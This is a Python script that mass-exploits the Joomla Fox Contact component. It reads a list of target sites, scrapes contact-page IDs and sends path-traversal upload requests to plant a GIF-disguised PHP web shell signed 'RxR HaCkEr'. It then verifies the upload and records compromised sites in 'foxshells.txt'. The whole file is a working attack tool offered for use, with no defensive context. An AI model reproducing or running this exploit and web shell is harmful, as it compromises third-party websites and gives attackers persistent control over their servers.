import requests as r # pip3 install requests
import argparse as arg
import os, sys
import urllib2,urllib,re
from multiprocessing import Pool
from multiprocessing.dummy import Pool as ThreadPool
from urlparse import urlparse
from lxml import html
 
shell = """GIF89a <?php echo 'RxR HaCkEr'.'<br>'.'Uname:'.php_uname().'<br>'.$cwd = getcwd(); Echo '<center>  <form method="post" target="_self" enctype="multipart/form-data">  <input type="file" size="20" name="uploads" /> <input type="submit" value="upload" />  </form>  </center></td></tr> </table><br>'; if (!empty ($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);     Echo "<script>alert('upload Done'); 	 	 </script><b>Uploaded !!!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; } ?>"""
 
ContactX = ['/contact','/index.php/contact-us','/contact.html','/index.php/contact','/kontakt.html','/index.php/kontakt','/kontakt','/index.php/contacto','/contacto','/contacto.html','/iletisim','/iletisim.html','/index.php/iletisim','/kontakty','/kontakty.html','/index.php/kontakty','/index.php/contatti','/contactar','/index.php/contactar','contactar.html']
 
def Fox_Contact(url):
        if url[-1] != "/":
 
            url = site + "/"
        if url[:7] != "http://" and url[:8] != "https://":
 
                url = "http://" + url
        return url
user_agent = {'User-agent': 'Mozilla/5.0'}
 
Filelist = open(sys.argv[1], 'r').readlines()
for i in Filelist:
         try:
            page = r.get(i.strip())
            webpage = html.fromstring(page.content)
            zz=webpage.xpath('//a/@href')
            print zz
            for cont in zz:
                try:
                  if "http" in cont or "//" in cont or ":" in cont or "#" in cont or "nta" not in cont:
                         print ""
                  else:
                         print("Hacking "+cont+" now\n")
                         url=i.strip()
                         urlpa = urlparse(url)
                         site  = urlpa.netloc
                         site=Fox_Contact(url)
                         print "[#]Url:"+site
 
                         req   = urllib2.Request(url+cont)
                         opreq = urllib2.urlopen(req).read()
                         cids = re.findall('<a name="cid_(.*?)"></a>',opreq) or re.findall('<a name="mid_(.*?)"></a>',opreq)
                         for cid in cids:
                                 cid=str(cid)
                                 print "[#]Cid found:"+cid
                                 b0x_dir = ["components/com_foxcontact/lib/file-uploader.php?cid={}&mid={}&qqfile=/../../mrpatate.php".format(cid, cid), "index.php?option=com_foxcontact&view=loader&type=uploader&owner=component&id={}?cid={}&mid={}&qqfile=/../../mrpatate.php".format(cid, cid, cid), "index.php?option=com_foxcontact&amp;view=loader&amp;type=uploader&amp;owner=module&amp;id={}&cid={}&mid={}&owner=module&id={}&qqfile=/../../mrpatate.php".format(cid, cid, cid, cid), "components/com_foxcontact/lib/uploader.php?cid={}&mid={}&qqfile=/../../mrpatate.php".format(cid, cid)]
                                 diretorios=0
                                 print b0x_dir
                                 for diretorio in b0x_dir:
                                        diretorios += 1
                                        print "kaka"
                                        url_vuln = site +diretorio
                                        shell_dir = site + "components/com_foxcontact/mrpatate.php"
                                        checa_site = r.get(url_vuln, headers=user_agent)
                                        print url_vuln +checa_site.text
                                        if '{"' in checa_site.text:
                                                print( "\n[!] exploiting "+url_vuln+" in {}...".format(diretorios))
                                                rxr=open("rxr.txt","a")
                                                rxr.write(url_vuln+"\n")
                                                rxr.close()
                                                envia_shell = r.post(url_vuln, data=shell, headers=user_agent)
 
                                                verifica_shell = r.get(shell_dir, headers=user_agent)
                                                if "RxR" in verifica_shell.text:
                                                        a = open('foxshells.txt','a')
                                                        a.write(shell_dir+'\n')
                                                        print( "\n[*]Shell uploaded ")
                                                        print( "[+] shell dir "+shell_dir)
                                                else:
                                                        print("shell not uploaded: ", shell_dir)
                                        else:
                                                print("\n[-] Not vuln : {}.".format(diretorios))
                except Exception as e:
                        print str(e)
         except Exception as ex :
                   print str(ex)
 
pool = ThreadPool(10)
pool.map(Fox_Contact, Filelist)
pool.close()
pool.join()